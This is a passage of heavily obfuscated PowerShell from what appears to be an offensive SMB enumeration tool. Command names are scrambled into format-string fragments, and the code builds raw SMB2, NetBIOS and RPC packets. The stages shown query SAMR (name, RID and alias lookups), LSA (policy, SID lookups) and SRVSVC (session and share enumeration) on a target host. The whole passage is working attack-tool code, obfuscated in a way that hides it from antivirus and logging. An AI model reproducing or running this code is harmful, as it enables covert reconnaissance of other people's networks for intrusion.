                        ${sm`B`_HE`AdER} = &("{6}{0}{4}{5}{3}{1}{2}{7}"-f 'nvertFrom','tOrderedDictio','na','e','-Pac','k','Co','ry') ${pAcK`et_sMB_`HeAD`ER}
                        ${Sm`B_dA`Ta} = &("{9}{8}{1}{0}{2}{5}{7}{3}{4}{6}" -f 'rtFr','ve','om-Pac','edD','ictio','ketOr','nary','der','on','C') ${PaC`ke`T_SMB`_dA`Ta} 
                        ${rPc_d`AtA`_L`eNGth} = ${s`m`B_Da`TA}."l`enGtH" + ${Rpc_da`TA}."l`eNgth" + ${S`AMR_`daTa}."len`gTH"
                        ${P`ACkET`_`NeTBI`Os_s`esSIon`_serv`I`cE} = &("{5}{8}{2}{4}{3}{9}{7}{0}{1}{6}" -f 'r','vic','etNetBIOSSe','s','s','Ne','e','e','w-Pack','ionS') ${sM`B_H`E`ADEr}."l`E`NGtH" ${R`pC_`daTA_`lenGth}
                        ${neTb`Io`s_S`ESSIoN_`sERVi`Ce} = &("{6}{5}{1}{2}{4}{3}{0}" -f'tionary','rom','-PacketOrdere','Dic','d','nvertF','Co') ${PA`cKet_`NE`TBIoS`_sESsI`oN_sErv`ice}
                        ${clieN`T_s`END} = ${NE`TBiOS_SESsiO`N`_`s`e`RV`ICE} + ${sM`B_Hea`dER} + ${S`Mb_dA`Ta} + ${RpC`_DA`Ta} + ${sam`R_DA`TA}
                        ${stA`gE} = ("{3}{2}{0}{1}" -f'e','ceive','endR','S')
                    }

                    ("{0}{2}{1}"-f 'Lo','off','g')
                    {
                        ${M`essAG`e_`Id}++
                        ${Sta`gE_Cur`R`E`Nt} = ${sTA`Ge}
                        ${PaCKeT`_`s`m`B_HeADEr} = &("{3}{1}{0}{4}{2}" -f 'ketSMB2H','Pac','ader','New-','e') 0x02,0x00 0x01,0x00 ${SmB_SI`g`N`inG} ${M`eSSag`e`_ID} ${pRoc`ess_`iD} ${TRee`_`ID} ${sE`SSi`o`N_ID}
                        ${pac`kEt`_sm`B_Data} = &("{3}{4}{8}{0}{1}{7}{5}{2}{6}"-f 'B2','Se','off','New-P','acketS','Log','Request','ssion','M')
                        ${smb_`hEaD`eR} = &("{1}{5}{6}{7}{2}{0}{3}{4}"-f 'd','Co','etOr','eredDic','tionary','nvertFr','om-Pac','k') ${PACKET_`Sm`B_HE`AdeR}
                        ${S`MB_`DA`TA} = &("{9}{3}{2}{7}{0}{5}{1}{6}{10}{4}{8}"-f'redD','t','ketOr','om-Pac','ar','ic','io','de','y','ConvertFr','n') ${pA`cKe`T_smB_da`TA}
                        ${p`AcKE`T`_N`e`Tbios_Se`sS`i`ON_SeRv`IcE} = &("{0}{7}{5}{6}{1}{2}{3}{4}"-f'New-','NetBI','OSSessionSe','rvic','e','ac','ket','P') ${sM`B`_h`eAdER}."LeNG`TH" ${SMb_D`A`Ta}."le`Ngth"
                        ${NEtbio`S_Se`sS`iON`_ser`VicE} = &("{3}{5}{0}{2}{4}{1}{6}"-f 'e','m-Pac','rtFr','Con','o','v','ketOrderedDictionary') ${pA`ckEt_nE`Tb`IOs_sEs`SioN_SerV`IcE}
                        ${Cli`enT`_s`eNd} = ${nETbIos_`S`esSI`ON`_`s`e`Rvice} + ${SMB`_`hE`Ader} + ${Sm`B_DA`TA}
                        ${S`Tage} = ("{1}{2}{0}" -f'ceive','Sen','dRe') 
                    }

                    ("{0}{3}{2}{1}"-f'Lookup','s','e','Nam')
                    {
                        ${mE`S`SaG`E_ID}++
                        ${S`T`AGe_CuRRENt} = ${st`A`Ge}
                        ${PacK`E`T_s`mb_HEA`d`Er} = &("{4}{2}{0}{3}{1}" -f 'S','der','Packet','MB2Hea','New-') 0x0b,0x00 0x01,0x00 ${s`MB_si`gNi`NG} ${M`EssAg`E_id} ${PROC`es`S_`ID} ${T`R`ee_ID} ${sE`S`SiO`N_ID}
                        ${p`A`ckET_sa`mR_D`Ata} = &("{4}{1}{3}{2}{0}" -f'mes','w-Packe','okupNa','tSAMRLo','Ne') ${samR_doma`I`N_`HaND`Le} ${g`RO`Up}
                        ${sam`R`_daTA} = &("{0}{3}{1}{2}{5}{4}" -f 'Con','F','rom-P','vert','ionary','acketOrderedDict') ${pACkET`_`S`A`MR_dATA} 
                        ${PAck`e`T_rp`C`_dATa} = &("{5}{0}{4}{3}{1}{2}{6}"-f'-P','RPC','R','t','acke','New','equest') 0x03 ${Samr_D`A`Ta}."lEnG`TH" 0 0 0x08,0x00,0x00,0x00 0x00,0x00 0x11,0x00
                        ${p`AC`KET_`sMb_datA} = &("{3}{0}{6}{5}{1}{4}{2}"-f'Packet','Ioc','lRequest','New-','t','MB2','S') 0x17,0xc0,0x11,0x00 ${fi`lE_`iD} ${SaMR`_`DAta}."LE`NG`Th" 4280
                        ${rPC`_dA`TA} = &("{2}{4}{6}{8}{7}{9}{1}{3}{5}{10}{0}" -f'nary','ketOrderedD','Con','i','vert','c','Fr','m-P','o','ac','tio') ${PaC`KEt`_r`PC_D`ATA}
                        ${SM`B`_hE`ADER} = &("{6}{1}{0}{7}{3}{2}{5}{4}"-f'Or','rtFrom-Packet','Dic','d','ary','tion','Conve','dere') ${pAcK`et_SMb`_HE`AdeR}
                        ${S`M`B`_DAtA} = &("{0}{2}{6}{7}{10}{5}{1}{3}{4}{8}{9}"-f'Co','d','n','ere','dDicti','etOr','v','ertFro','o','nary','m-Pack') ${PacK`et_`sMB_D`Ata} 
                        ${rPc_`da`Ta_leNG`Th} = ${sm`B_DaTa}."LE`NGth" + ${rPC_`da`TA}."LeN`GTH" + ${sa`mR_dA`Ta}."L`eNgTh"
                        ${packeT_`Ne`T`Bios_`sE`ssIo`N_Se`RVicE} = &("{5}{3}{1}{4}{2}{6}{9}{7}{8}{0}" -f'ice','acket','e','P','N','New-','t','SessionSe','rv','BIOS') ${SM`B_h`EadER}."LEN`GTh" ${RpC_d`A`T`A_`LENg`Th}
                        ${NET`Bios`_SEssi`on`_`S`eRViCE} = &("{0}{2}{5}{1}{4}{3}"-f 'Conv','on','ertFrom-Packet','ry','a','OrderedDicti') ${pAck`E`T_`NeTbIoS`_s`EsSIon_s`e`R`VicE}
                        ${C`LiE`Nt_SE`ND} = ${n`E`TBi`os_sEssIoN_sEr`V`I`CE} + ${sMB_`HEa`dEr} + ${smb_d`ATa} + ${R`pC_`Data} + ${SAM`R_da`Ta}
                        ${st`AgE} = ("{0}{2}{1}"-f'SendRe','e','ceiv')
                    }

                    ("{1}{0}{2}"-f'id','LookupR','s')
                    {
                        ${m`ES`SAg`e_id}++
                        ${STaGe`_`C`URrEnT} = ${St`A`ge}
                        ${P`ACk`et_`SMB_`heAD`eR} = &("{2}{1}{3}{0}" -f'etSMB2Header','e','N','w-Pack') 0x0b,0x00 0x01,0x00 ${SMb`_sI`gNinG} ${M`es`sa`ge_Id} ${PRocESs`_`Id} ${tRe`E_`Id} ${s`essIo`N_iD}
                        ${pACK`Et_s`AMR`_data} = &("{0}{1}{3}{4}{2}"-f'New-Pa','cke','okupRids','tS','AMRLo') ${SAmr`_Do`m`A`in_H`ANdle} ${rI`d`_coUnT`_ByTES} ${ri`d`_LIsT}
                        ${S`AMr`_d`AtA} = &("{10}{1}{4}{3}{5}{0}{8}{9}{7}{2}{6}" -f 'tO','rom-Pa','i','k','c','e','onary','edDict','rd','er','ConvertF') ${pAC`ke`T_SA`mr`_data} 
                        ${p`A`Cke`T_rp`C_DaTa} = &("{2}{4}{3}{1}{0}"-f 't','s','New-','etRPCReque','Pack') 0x03 ${S`A`Mr_DaTa}."LE`NGTH" 0 0 0x0b,0x00,0x00,0x00 0x00,0x00 0x12,0x00
                        ${PACK`ET_SM`B_`Data} = &("{2}{1}{0}{5}{3}{4}"-f 'etSMB2I','k','New-Pac','lR','equest','oct') 0x17,0xc0,0x11,0x00 ${f`Il`E_iD} ${SaMR_`DA`Ta}."LeN`gtH" 4280
                        ${R`Pc_`d`AtA} = &("{0}{6}{7}{1}{5}{8}{3}{4}{2}"-f'Co','ketO','y','na','r','rde','nvertFrom-Pa','c','redDictio') ${PaC`K`ET_rpc_`Da`Ta}
                        ${SMB_H`EAD`eR} = &("{0}{3}{8}{7}{2}{6}{1}{5}{4}"-f 'Conv','ketOrderedDic','-','er','ary','tion','Pac','From','t') ${pAck`ET_s`mB_`HeadeR}
                        ${S`Mb_d`Ata} = &("{3}{2}{4}{8}{0}{5}{6}{7}{1}"-f 'rtF','ry','n','Co','v','rom-PacketOr','der','edDictiona','e') ${pac`KE`T_sMb_`DAtA} 
                        ${RpC`_`data_LENG`TH} = ${S`mb_DAtA}."lEnG`TH" + ${R`pc`_DaTA}."LEng`TH" + ${SaMr_`da`Ta}."lE`NGtH"
                        ${packet`_N`ETbIoS_`s`E`ssi`ON_sERV`I`Ce} = &("{4}{1}{2}{8}{0}{5}{7}{3}{6}" -f'es','c','ketNetBIOS','nServi','New-Pa','s','ce','io','S') ${sMb_`hE`ADeR}."LEn`Gth" ${rpc_`dA`Ta`_lE`NGTH}
                        ${N`ETbIos_sE`sS`I`o`N_SErVi`CE} = &("{5}{6}{0}{3}{4}{1}{2}"-f'rdere','iction','ary','d','D','ConvertFrom-Packe','tO') ${pA`ck`eT_N`ETBios_seS`sIoN_`seRVice}
                        ${CliE`N`T_SENd} = ${neTbi`O`S_`sessiON_`sE`R`VIce} + ${SMB`_`hEad`Er} + ${s`mb_D`ATa} + ${rPc`_`DaTA} + ${SAMR`_D`Ata}
                        ${S`T`AgE} = ("{0}{2}{3}{1}" -f 'Send','eive','R','ec')
                    }

                    ("{1}{2}{0}"-f 'ose','LSA','Cl')
                    {
                        ${mEs`sAG`E_ID}++
                        ${s`TaGE`_CUR`ReNt} = ${ST`AGE}
                        ${PACk`ET_smb`_`hEa`DEr} = &("{0}{1}{3}{2}{4}" -f 'New-P','a','ead','cketSMB2H','er') 0x0b,0x00 0x01,0x00 ${s`MB_Sig`N`InG} ${m`esSAGE_`ID} ${PR`ocES`s_`Id} ${tR`E`e_iD} ${s`E`ssiON`_Id}
                        ${pACK`Et_LSArp`c`_dATA} = &("{1}{5}{3}{0}{2}{4}"-f 'ketLS','Ne','AClo','-Pac','se','w') ${POlI`C`Y_h`ANdle}
                        ${LS`ArP`c`_DaTa} = &("{0}{3}{6}{7}{2}{5}{4}{1}{8}"-f'Conver','n','ered','tFr','io','Dict','om-Packe','tOrd','ary') ${pacK`eT_L`SAr`Pc_DAta} 
                        ${pA`cKEt_smb_`da`Ta} = &("{6}{2}{3}{1}{4}{5}{0}"-f 'est','M','ck','etS','B2Ioctl','Requ','New-Pa') 0x17,0xc0,0x11,0x00 ${Fi`le_id} ${LSaR`pc_dA`TA}."LEn`Gth" 4280
                        ${PaC`Ke`T_RPc_dA`TA} = &("{2}{1}{4}{3}{5}{0}" -f'st','c','New-Pa','CR','ketRP','eque') 0x03 ${LsarP`c_DA`Ta}."lENG`TH" 0 0 0x04,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                        ${Rp`C_`DaTA} = &("{2}{5}{0}{1}{4}{3}{6}" -f'tF','rom-','Conv','etOrderedDi','Pack','er','ctionary') ${p`Ac`ke`T`_RP`c_DaTa}
                        ${SMB_hEa`D`ER} = &("{7}{1}{6}{2}{9}{8}{3}{5}{4}{0}" -f'y','onvertFrom','P','etOrder','r','edDictiona','-','C','k','ac') ${PAcK`Et_`SM`B_h`eAder}
                        ${sMb`_`DatA} = &("{2}{6}{1}{9}{10}{4}{3}{8}{7}{0}{5}" -f 'n','m-Pack','Conver','i','dD','ary','tFro','tio','c','et','Ordere') ${p`AC`KET_`SMb`_DaTa} 
                        ${r`Pc_`dAt`A_LeNgtH} = ${sM`B_Da`TA}."lE`N`gth" + ${rPC`_DatA}."lE`N`gTH" + ${l`sarPc_`d`ATa}."len`gth"
                        ${pacKet`_n`e`Tbi`O`s_SesS`IoN_s`E`Rv`iCE} = &("{2}{3}{0}{1}{5}{4}{6}"-f'O','SS','New-PacketNe','tBI','ssionServ','e','ice') ${sm`B_hEad`Er}."l`ENGth" ${rPC`_datA_`l`eng`TH}
                        ${neTBiOS_`s`Es`S`iON_Se`RviCe} = &("{2}{4}{0}{1}{5}{3}" -f 'ck','etO','Con','y','vertFrom-Pa','rderedDictionar') ${pA`ckeT_netBI`Os_sEssiON_`s`ERvI`CE}
                        ${Cl`IeNt_`s`END} = ${N`Etb`Io`S`_S`essIOn_SErVicE} + ${s`mb`_HeA`dEr} + ${smB_`D`ATa} + ${Rpc`_`dAta} + ${L`sA`RpC_d`ATA}
                        ${S`TaGE} = ("{1}{3}{0}{2}"-f'ei','Send','ve','Rec')
                        ${s`TEp}++
                    }

                    ("{1}{3}{2}{0}" -f 'ds','LSALook','Si','up')
                    {
                        ${m`EsSaGE`_`ID}++
                        ${sTaGE_`CU`RRent} = ${sT`AGe}
                        ${paCke`T_Smb_`HEA`Der} = &("{1}{3}{0}{4}{2}{5}" -f 'PacketS','N','B2Hea','ew-','M','der') 0x0b,0x00 0x01,0x00 ${sM`B`_sign`INg} ${M`e`SsAGE_iD} ${p`Roce`S`s_ID} ${Tr`EE_id} ${SE`SS`iOn_Id}
                        ${pAC`KET`_`lsA`RP`C_datA} = &("{2}{4}{3}{1}{0}" -f'pSids','PacketLSALooku','N','-','ew') ${pOl`icy_hAnD`Le} ${sId_Ar`R`Ay}
                        ${L`SaRp`C`_DaTA} = &("{5}{1}{6}{0}{7}{2}{3}{4}{8}"-f 'e','rtF','dered','Dict','iona','Conve','rom-Pack','tOr','ry') ${p`ACKE`T`_Lsar`PC_`DA`TA}
                        ${p`AcKET_SmB`_`dATA} = &("{1}{4}{0}{2}{5}{3}"-f 'tSMB','N','2I','lRequest','ew-Packe','oct') 0x17,0xc0,0x11,0x00 ${fIl`e_id} ${L`S`ARP`C_dATa}."L`enGtH" 4280
                        ${PAcKET_Rp`C_d`A`TA} = &("{3}{1}{4}{0}{2}" -f'eque','cket','st','New-Pa','RPCR') 0x03 ${l`s`Arpc_`Data}."Le`NGth" 0 0 0x10,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        ${R`Pc_da`Ta} = &("{1}{4}{3}{2}{6}{5}{0}"-f'ctionary','Co','m-PacketOrder','ro','nvertF','dDi','e') ${p`ACKeT_R`P`c_`da`Ta}   
                        ${sMB_`h`eAD`eR} = &("{3}{1}{5}{4}{7}{2}{0}{6}"-f'redDicti','nvert','de','Co','ack','From-P','onary','etOr') ${pA`cKe`T_S`M`B_HEAdER}
                        ${sm`B_da`Ta} = &("{4}{6}{2}{3}{5}{0}{1}"-f'icti','onary','er','e','ConvertFrom-Packet','dD','Ord') ${PACkeT`_SMb`_D`ATA} 
                        ${rpC_`DA`Ta`_`LEnGth} = ${smb_D`Ata}."lE`N`Gth" + ${Rp`C`_D`ATA}."LeNG`Th" + ${lSA`RpC_D`ATa}."l`Eng`Th"
                        ${p`A`cke`T_NeTBI`OS`_SE`Ss`IOn`_SErvIcE} = &("{5}{6}{7}{0}{4}{2}{1}{3}"-f'etBIOSSe','er','ionS','vice','ss','New-','Packe','tN') ${sm`B_H`EAdeR}."LENG`Th" ${RPc`_da`T`A_Le`N`Gth}
                        ${NEtBio`s_seSsion`_s`eRV`IcE} = &("{6}{1}{4}{0}{5}{3}{2}" -f'redD','ke','ary','on','tOrde','icti','ConvertFrom-Pac') ${pA`C`k`ET`_nET`BioS_sESSION`_se`RvICe}
                        ${C`LIE`NT_S`EnD} = ${nEt`B`IOs_Se`sSiON`_se`RvI`Ce} + ${SM`B_`headEr} + ${S`M`B_dAtA} + ${Rpc`_DA`Ta} + ${LSaRPc_`D`Ata}
                        ${S`TAGe} = ("{2}{0}{1}" -f'Receiv','e','Send')
                    }

                    ("{3}{2}{1}{0}"-f 'y','olic','penP','LSAO')
                    {
                        ${Me`S`sa`gE_ID}++
                        ${S`Ta`ge_Curr`ENt} = ${stA`ge}
                        ${paCKet`_S`Mb`_He`ADer} = &("{2}{4}{3}{1}{0}"-f'ader','2He','New-Pa','MB','cketS') 0x0b,0x00 0x01,0x00 ${sm`B`_s`IgNInG} ${M`esSAg`E_iD} ${PrOCE`ss`_iD} ${tR`ee`_id} ${s`eSsIo`N_`iD}
                        ${paCKet`_l`SARPC_d`Ata} = &("{4}{2}{0}{3}{1}" -f'SAOpen','icy','PacketL','Pol','New-')
                        ${l`sAr`pC_dA`Ta} = &("{3}{5}{0}{2}{4}{7}{1}{6}{8}" -f'-Packe','dDict','t','Co','Orde','nvertFrom','ionar','re','y') ${PA`cK`E`T_`lSARPC_Data} 
                        ${PAc`kET`_smb_d`ATA} = &("{0}{3}{1}{2}{4}"-f 'New-PacketS','ct','lR','MB2Io','equest') 0x17,0xc0,0x11,0x00 ${F`ILe_`Id} ${LsARp`C`_D`AtA}."lEn`GtH" 4280
                        ${Pa`C`KEt`_RPC_Data} = &("{1}{2}{3}{4}{0}" -f 'est','Ne','w-PacketRP','CR','equ') 0x03 ${LsArPc_`DA`TA}."l`ENGTh" 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x06,0x00
                        ${RpC`_dAtA} = &("{6}{4}{5}{1}{3}{0}{2}"-f 'na','e','ry','redDictio','tFrom-P','acketOrd','Conver') ${Pa`ck`eT_`RpC_Da`TA}
                        ${s`mb`_he`ADer} = &("{4}{9}{2}{3}{7}{8}{5}{0}{1}{6}" -f'i','ona','-','PacketOrdered','Con','t','ry','Di','c','vertFrom') ${P`AcKE`T_Sm`B_H`Ea`DER}
                        ${SMb_`da`TA} = &("{4}{5}{2}{1}{0}{3}{6}{7}"-f'e','rder','etO','d','ConvertFr','om-Pack','Dict','ionary') ${pACkEt`_`sM`B_DATa} 
                        ${R`PC`_dAtA_LENG`TH} = ${Smb`_`DAta}."LE`NG`TH" + ${rpC`_`data}."Le`NGtH" + ${lSA`RPc_D`A`Ta}."lEng`TH"
                        ${p`AcK`Et_`Net`B`ios_SEs`sion_`SeR`VICE} = &("{5}{6}{4}{0}{3}{1}{2}" -f'O','essionServi','ce','SS','tBI','New-P','acketNe') ${sMB`_`HEAdEr}."len`gtH" ${RpC`_`DAtA`_Le`NGTH}
                        ${n`eT`B`iO`S_`SesSI`on`_sERVIcE} = &("{3}{0}{5}{7}{2}{8}{1}{4}{6}"-f 'v','tio','etOrderedDi','Con','na','e','ry','rtFrom-Pack','c') ${pACKEt`_`NE`T`BiOs_SessiOn_`SerVICE}
                        ${CLIen`T_`S`eNd} = ${NeTbiOS_S`es`SioN`_s`e`Rvi`Ce} + ${sMb_H`ea`DER} + ${S`mb_da`TA} + ${rpc`_Da`Ta} + ${lsaRP`C`_Da`TA}
                        ${sT`Age} = ("{1}{0}{2}"-f'dR','Sen','eceive')
                    }

                    ("{2}{3}{5}{1}{0}{4}" -f'f','n','L','SAQ','oPolicy','ueryI')
                    {
                        ${M`eSSAG`E_`iD}++
                        ${StagE_`c`Urr`eNt} = ${s`TAgE}
                        ${p`AcKeT_sM`B_H`eAD`ER} = &("{4}{3}{2}{0}{1}"-f 'eade','r','tSMB2H','acke','New-P') 0x0b,0x00 0x01,0x00 ${smB`_SI`G`Ning} ${MeSSA`G`e_ID} ${PROc`esS`_iD} ${tr`Ee`_iD} ${se`SsiO`N_iD}
                        ${Pack`Et_l`s`Ar`pC_d`ATa} = &("{6}{4}{0}{3}{5}{1}{2}" -f 'SAQue','ic','y','ry','ketL','InfoPol','New-Pac') ${pOLICY`_HAND`le}
                        ${lS`ArPC_da`Ta} = &("{7}{1}{0}{3}{2}{9}{4}{10}{5}{6}{8}" -f 'm-P','rtFro','ck','a','rdere','Di','ction','Conve','ary','etO','d') ${pAc`KeT_LSArp`c_D`AtA}
                        ${paCke`T`_S`mb`_datA} = &("{6}{2}{0}{7}{4}{1}{3}{5}"-f 'Pa','B2Ioctl','ew-','Re','M','quest','N','cketS') 0x17,0xc0,0x11,0x00 ${F`ILE`_Id} ${Lsar`Pc`_d`AtA}."LENG`TH" 4280
                        ${P`Ack`Et`_`RPc_DATa} = &("{2}{3}{4}{0}{5}{1}"-f'RPC','t','New-Pa','ck','et','Reques') 0x03 ${Lsa`R`Pc_DatA}."l`E`Ngth" 0 0 0x03,0x00,0x00,0x00 0x00,0x00 0x07,0x00
                        ${RPc_`D`ATa} = &("{2}{3}{4}{1}{0}{5}"-f 'ketOrdered','-Pac','Conver','t','From','Dictionary') ${P`AcKeT`_`RPc_daTa}   
                        ${smb_`he`ADer} = &("{9}{8}{1}{3}{6}{7}{0}{2}{5}{4}" -f 'icti','ro','ona','m-PacketOr','y','r','de','redD','nvertF','Co') ${Pac`Ke`T_s`mB_H`EaDer}
                        ${SMB`_`DaTa} = &("{1}{4}{8}{3}{0}{6}{2}{7}{5}"-f 'm-P','C','tOrde','vertFro','o','edDictionary','acke','r','n') ${paCKEt_`SmB`_DATA} 
                        ${rpc_da`T`A_LengtH} = ${Smb`_d`A`TA}."l`Ength" + ${r`PC`_DaTA}."lE`NGtH" + ${l`s`ARPC_data}."l`eNGtH"
                        ${pACKET`_N`ETBIOs`_SESS`IoN_SER`V`icE} = &("{8}{4}{1}{6}{5}{7}{3}{2}{0}" -f'SessionService','w','IOS','tB','e','ket','-Pac','Ne','N') ${SmB_`H`eAd`er}."lEN`Gth" ${r`PC_dat`A_leNG`TH}
                        ${nE`TbIO`s_`SES`s`I`ON_sErVI`CE} = &("{7}{9}{3}{6}{1}{2}{4}{5}{0}{8}"-f 'n','m-Pack','etOr','r','deredDict','io','o','Co','ary','nvertF') ${pack`eT_NetBIOS`_S`ES`si`on_sErvI`cE}
                        ${C`LIent_`SEnd} = ${neTBI`os`_sE`s`siOn_S`erv`Ice} + ${s`mb_H`Ead`ER} + ${s`MB`_dAta} + ${r`pc_`dAta} + ${LS`ARPC`_DatA}
                        ${ST`AGe} = ("{0}{1}{2}" -f 'SendRece','iv','e') 
                    }

                    ("{1}{0}{2}"-f'Ses','Net','sEnum')
                    {
                        ${ME`sSage`_`ID}++
                        ${STA`G`E`_CURrEnt} = ${S`TAGe}
                        ${pa`c`kET_sm`B_header} = &("{2}{3}{4}{0}{1}"-f 'tSMB','2Header','New','-Pac','ke') 0x0b,0x00 0x01,0x00 ${SMb_Sig`N`ing} ${Me`sS`AG`e_ID} ${PR`Oc`EsS`_id} ${T`R`eE_id} ${sEs`sioN`_Id}
                        ${pACk`e`T_`SRVsVC`_`dATa} = &("{1}{3}{0}{4}{2}" -f 'tSRVSVCNetSe','New','sEnum','-Packe','s') ${T`A`RgET}
                        ${s`Rv`Svc_dAtA} = &("{3}{6}{0}{4}{5}{7}{2}{1}{8}" -f 've','red','e','Co','rtFrom-Pa','ck','n','etOrd','Dictionary') ${Pa`ckE`T_sRV`sV`C`_DaTA}
                        ${pACKEt`_s`m`B_DAta} = &("{7}{2}{4}{0}{1}{6}{5}{3}"-f'etSMB2I','octl','w-Pac','t','k','ues','Req','Ne') 0x17,0xc0,0x11,0x00 ${Fil`e_`ID} ${S`Rv`SVC_DaTa}."L`EngTH" 1024
                        ${pAc`kE`T_`Rpc_daTa} = &("{2}{1}{4}{0}{3}{5}" -f 'ack','w-','Ne','etRPCRe','P','quest') 0x03 ${sr`V`sV`C_Data}."l`ENGTH" 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00                        
                        ${rp`c`_dAta} = &("{4}{5}{2}{7}{1}{0}{6}{3}" -f 'ict','dD','tOr','onary','Conve','rtFrom-Packe','i','dere') ${pA`CK`ET_R`P`c_dATA}
                        ${smb`_h`ea`dER} = &("{0}{3}{1}{6}{9}{7}{8}{2}{5}{4}"-f 'Con','ertF','cti','v','ary','on','rom-Pack','t','OrderedDi','e') ${PACk`eT`_`SMB_`HEadEr}
                        ${s`MB`_DaTa} = &("{1}{6}{5}{0}{2}{7}{4}{3}"-f'd','Co','ere','ary','on','-PacketOr','nvertFrom','dDicti') ${PA`CkeT`_`S`mB_DAta} 
                        ${r`p`C_datA_lEng`Th} = ${SmB`_d`Ata}."LENg`Th" + ${RPC`_`data}."le`N`gtH" + ${srVS`V`C_dA`TA}."le`NgtH"
                        ${PACK`eT`_`NEtBI`os_sessioN`_SeR`V`iCE} = &("{0}{1}{4}{5}{3}{2}"-f'New-Pac','k','e','ssionServic','et','NetBIOSSe') ${SmB_h`eAd`ER}."Le`NGTh" ${r`Pc_D`Ata`_le`NGth}
                        ${n`eTB`IOS`_sEs`Si`on_SeRVIce} = &("{6}{10}{5}{4}{1}{3}{7}{8}{2}{9}{0}"-f 'nary','e','edDic','tOr','Pack','m-','C','d','er','tio','onvertFro') ${pA`CK`Et_nET`Bi`os`_sesSIoN`_`serVicE}
                        ${C`lienT_`s`enD} = ${NETBio`S`_s`E`sS`ION_Se`Rvi`Ce} + ${sMb_`hEA`D`er} + ${Sm`B_DA`TA} + ${RP`c_dATa} + ${SR`VSV`c_`DATa}
                        ${S`T`AgE} = ("{0}{2}{1}"-f'Se','e','ndReceiv')
                    }
                    
                    ("{3}{4}{1}{2}{0}"-f 'll','um','A','NetSha','reEn')
                    {
                        ${me`Ssage`_`iD}++
                        ${st`AGE`_curRENt} = ${St`A`Ge}
                        ${pacK`Et`_SMb_`H`ea`DEr} = &("{4}{2}{0}{3}{1}" -f '2H','r','cketSMB','eade','New-Pa') 0x0b,0x00 0x01,0x00 ${Sm`B`_Signing} ${mEsSAg`e_`iD} ${p`ROCe`S`s_iD} ${tRE`E`_Id} ${Sess`I`ON_`ID}
                        ${pAC`K`eT`_`s`RVsvc_Data} = &("{0}{5}{2}{4}{3}{1}" -f 'New-Pa','ll','VSVCNe','EnumA','tShare','cketSR') ${TArG`eT}
                        ${S`R`V`sVc_dAtA} = &("{7}{5}{6}{8}{0}{3}{4}{1}{9}{2}" -f 'acket','r','ary','Or','de','nve','rt','Co','From-P','edDiction') ${PAc`ket_srv`sVC_D`ATA} 
                        ${p`ACk`e`T`_`SMB_dAtA} = &("{1}{2}{0}{4}{3}"-f 'B','New-','PacketSM','Request','2Ioctl') 0x17,0xc0,0x11,0x00 ${fI`l`e_iD} ${sRvsvc_`Da`Ta}."Len`g`Th" 4280
                        ${P`ACkET_`R`pc_daTA} = &("{1}{0}{3}{2}" -f'-Packe','New','RPCRequest','t') 0x03 ${S`RvS`Vc_`DatA}."LEn`GTh" 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0f,0x00
                        ${r`pC`_data} = &("{0}{3}{5}{6}{1}{2}{4}" -f 'Con','er','edDict','vertF','ionary','rom-Packet','Ord') ${pa`Cket`_`RPC_da`Ta}
                        ${S`mB_h`Ea`DER} = &("{1}{7}{0}{5}{8}{2}{6}{4}{9}{3}"-f 'm','C','ac','dDictionary','e','-','k','onvertFro','P','tOrdere') ${PACket_s`mb`_heAd`eR}
                        ${sMB_D`AtA} = &("{5}{10}{3}{4}{9}{0}{1}{7}{2}{6}{8}" -f 'der','edD','tion','Fr','om-','Co','ar','ic','y','PacketOr','nvert') ${PA`CKEt_`SmB_D`AtA} 
                        ${RPc`_D`ATa`_`LENGTh} = ${S`mb_DA`TA}."l`en`gtH" + ${r`PC`_DaTa}."l`e`NGth" + ${sRvS`Vc_D`A`Ta}."LE`N`gTH"
                        ${Pac`kET`_neTBios_sEsSiO`N_`s`erviCe} = &("{2}{3}{0}{1}{7}{5}{6}{4}"-f 'cke','t','New-P','a','rvice','OSSession','Se','NetBI') ${SmB_He`AD`er}."L`en`Gth" ${rPC_DatA`_l`E`NG`TH}
                        ${netbI`Os`_sesSi`O`N_`ServicE} = &("{4}{3}{2}{1}{5}{0}"-f 'dDictionary','er','tOrd','Packe','ConvertFrom-','e') ${PAc`ket_NE`T`BI`oS_SEsSIO`N`_SEr`VICe}
                        ${clIeN`T`_`SEnd} = ${N`ETBiOS_`Sess`Io`N_sErV`ice} + ${SM`B_HeAd`ER} + ${sM`B`_DaTA} + ${rPC_Da`Ta} + ${sRV`svC`_dA`Ta}
                        ${s`TAgE} = ("{2}{0}{1}" -f 'ec','eive','SendR')
                    }

                    ("{0}{2}{1}"-f'Open','ias','Al')
                    {  
                        ${mesSa`G`e_iD}++
                        ${STA`gE_`cUrR`eNT} = ${stA`GE}
                        ${Pack`et_Sm`B_HE`A`D`eR} = &("{3}{0}{2}{5}{1}{4}"-f'w-Pac','ade','ketSMB2','Ne','r','He') 0x0b,0x00 0x01,0x00 ${s`mb`_s`IGniNG} ${M`eSsAge`_ID} ${prOcE`SS_`id} ${tr`Ee`_ID} ${Se`Ss`Ion_id}
                        ${PacK`ET_S`AM`R_`DaTa} = &("{3}{1}{6}{2}{4}{5}{0}" -f 's','ew-P','MR','N','Open','Alia','acketSA') ${SAMr_`d`OM`AIN_HanD`LE} ${S`Amr_`RID}
                        ${SAMR`_D`ATA} = &("{4}{1}{6}{7}{5}{8}{0}{3}{2}"-f'Or','nve','onary','deredDicti','Co','ke','rtF','rom-Pac','t') ${P`A`cKe`T_sAMr_DaTa} 
                        ${p`AckET`_R`PC_Data} = &("{3}{4}{2}{1}{0}"-f'uest','tRPCReq','ke','N','ew-Pac') 0x03 ${sa`mr`_d`ATa}."LE`Ng`TH" 0 0 0x0c,0x00,0x00,0x00 0x00,0x00 0x1b,0x00
                        ${p`Ac`K`ET_SmB_`DATA} = &("{4}{6}{5}{3}{0}{1}{2}"-f 'B2IoctlRe','q','uest','tSM','N','w-Packe','e') 0x17,0xc0,0x11,0x00 ${fI`Le_`ID} ${sam`R_`data}."Le`N`GTH" 4280
                        ${R`Pc_dA`TA} = &("{2}{0}{5}{3}{6}{4}{1}"-f'tFr','dDictionary','Conver','et','e','om-Pack','Order') ${P`AcK`ET_rpc_daTA}
                        ${Smb_`h`E`Ader} = &("{2}{3}{4}{0}{5}{1}"-f 'tO','y','Convert','F','rom-Packe','rderedDictionar') ${paC`ket_sMB_H`EAd`ER}
